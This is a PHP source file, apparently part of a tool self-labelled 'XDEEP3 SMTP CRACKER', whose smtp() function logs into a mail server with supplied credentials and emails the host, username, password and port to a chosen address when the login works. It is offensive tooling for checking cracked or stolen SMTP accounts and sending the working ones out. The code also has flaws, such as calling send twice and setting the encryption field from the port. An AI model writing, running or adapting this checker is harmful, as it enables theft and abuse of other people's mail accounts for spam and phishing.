<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// main function to check smtp if work 

function smtp($host,$username,$password,$port,$to){

    $mail = new PHPMailer(false);     
                         // Passing `true` enables exceptions
    //Server settings
    $mail->CharSet = 'UTF-8';
    $mail->SMTPDebug = 0;                                 // Enable verbose debug output
    $mail->isSMTP();                                      // Set mailer to use SMTP
    $mail->Host = $host;  // Specify main and backup SMTP servers
    $mail->SMTPAuth = true;                               // Enable SMTP authentication
    $mail->Username = $username;                 // SMTP username
    $mail->Password = $password;                           // SMTP password
    $mail->SMTPSecure = $port;                            // Enable TLS encryption, `ssl` also accepted
    $mail->Port = 587;                                    // TCP port to connect to

    //Recipients
    $mail->setFrom($username, 'XDEEP3 SMTP CRACKER');

    $mail->addAddress($to);     // Add a recipient

    //Content
    $mail->isHTML(true);  

    $mail->Subject    = "New SMTP FROM  : " .$username ." AT " . date("h:i:sa");

    $mail->Body = '
    
    SMTP INFO : <br> 

    SMTP HOST : '.$host.' <br>

    SMTP Username : '.$username.' <br>

    SMTP Password : '.$password.' <br>

    SMTP PORT : '.$port.' <br>



    ';
    

    $mail->send();

    if(!$mail->Send()) {
   
    // smtp is bad

    return false;

    
} else {

    // smtp is good

    return true;


}

}